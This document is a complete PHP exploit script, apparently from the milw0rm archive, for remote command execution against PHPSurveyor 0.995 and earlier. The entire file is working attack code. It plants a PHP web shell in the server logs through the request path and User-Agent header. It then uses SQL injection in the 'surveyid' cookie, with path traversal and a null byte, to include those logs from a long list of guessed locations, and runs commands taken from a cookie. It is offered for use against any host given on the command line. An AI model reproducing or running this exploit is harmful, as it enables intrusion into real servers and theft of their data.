#!/usr/bin/php -q -d short_open_tag=on
<?
echo "********************************************************************\r\n";
echo "* PHPSurveyor <= 0.995 'save.php/surveyid' remote cmmnds xctn      *\r\n";
echo "* by rgod rgod@autistici.org site: http://retrogod.altervista.org  *\r\n";
echo "* a special tnX goes to Frozen for his dork!                       *\r\n";
echo "* and a thanks to all people of johnny.ihackstuff.com!!            *\r\n";
echo "* site: http://retrogod.altervista.org                             *\r\n";
echo "* -> works regardless of magic_quotes gpc settings                 *\r\n";
echo "*    with at least one row in 'surveys' table                      *\r\n";
echo "*    and if we succeed to include logs                             *\r\n";
echo "********************************************************************\r\n";

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to PHPSurveyor\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /surveyor/ cat config.php\r\n";
echo "php ".$argv[0]." localhost /surveyor/ ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "[1] Injecting some code in log files ...\r\n\r\n";
$CODE="<?php echo 56789;error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){\$COOKIE[cmd]=stripslashes(\$COOKIE[cmd]);}passthru(\$_COOKIE[cmd]);die;?>";
$packet="GET ".$p.$CODE." HTTP/1.0\r\n";
$packet.="User-Agent: ".$CODE." Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacketii($packet);
sleep(3);

//fill with possible locations...
$paths=array(
"../../../../../../../../../../var/log/httpd/access_log",
"../../../../../../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../../../../../../apache/logs/error.log",
"../../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../../logs/error.log",
"../../../../../../logs/access.log",
"../../../../../../../../../../etc/httpd/logs/acces_log",
"../../../../../../../../../../etc/httpd/logs/acces.log",
"../../../../../../../../../../etc/httpd/logs/error_log",
"../../../../../../../../../../etc/httpd/logs/error.log",
"../../../../../../../../../../var/www/logs/access_log",
"../../../../../../../../../../var/www/logs/access.log",
"../../../../../../../../../../usr/local/apache/logs/access_log",
"../../../../../../../../../../usr/local/apache/logs/access.log",
"../../../../../../../../../../var/log/apache/access_log",
"../../../../../../../../../../var/log/apache/access.log",
"../../../../../../../../../../var/log/access_log",
"../../../../../../../../../../var/www/logs/error_log",
"../../../../../../../../../../var/www/logs/error.log",
"../../../../../../../../../../usr/local/apache/logs/error_log",
"../../../../../../../../../../usr/local/apache/logs/error.log",
"../../../../../../../../../../var/log/apache/error_log",
"../../../../../../../../../../var/log/apache/error.log",
"../../../../../../../../../../var/log/access_log",
"../../../../../../../../../../var/log/error_log"
);


for ($i=0; $i<=count($paths)-1; $i++)
{
$a=$i+2;

//bypassing magic_quotes=On encoding paths with CHAR() MySQL func
$mysql_encoded="CHAR(";
  for ($j=0; $j<=strlen($paths[$i])-1; $j++)
  {
   $mysql_encoded.=ord($paths[$i][$j]);
   if ($j==strlen($paths[$i])-1)
   {$mysql_encoded.=",0)";} //a null char to break inclusion path, encoded as CHAR(0)
   else
   {$mysql_encoded.=",";}
  }

$SQL="999 UNION SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,".$mysql_encoded.",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM surveys";
echo "[".$a."] Trying with -> - ".$SQL." - for \"surveyd\" argument\r\n\r\n";
$SQL=urlencode($SQL);
$packet ="GET ".$p."save.php HTTP/1.0\r\n";
$packet.="User-Agent: GoogleBot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: surveyid=$SQL; cmd=".$cmd.";\r\n"; //let's poison the thissurvey['language'] value, thorugh cookies, log this :)
$packet.="Connection: Close\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);
if (strstr($html,"56789"))
    {
     echo "Exploit succeeded...\r\n";
     $temp=explode("56789",$html);
     die($temp[1]);
    }
}
//if you are here...
echo "Exploit failed...";
?>

# milw0rm.com [2006-04-20]
